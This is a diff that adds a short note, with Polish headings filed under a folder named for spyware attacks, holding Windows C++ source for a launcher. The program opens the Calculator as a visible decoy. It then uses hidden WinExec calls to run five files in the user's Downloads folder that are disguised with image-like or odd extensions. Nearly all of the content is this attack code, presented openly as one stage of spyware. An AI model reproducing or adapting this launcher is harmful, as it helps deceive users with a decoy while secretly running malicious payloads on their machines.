@@ -1,0 +1,29 @@
+---
+title: "Główny plik"
+folder: "Całe Ataki/1. Spyware"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void OpenCalc() {
+    if (ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\calc.exe", NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {}
+}
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    OpenCalc();
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\ketoo.bmpz", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\bitmap.bmpz", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\bitmapv2.bmpz", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\update.xrd", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\uninstall.xrd", 0);
+   
+    return 0;
+}
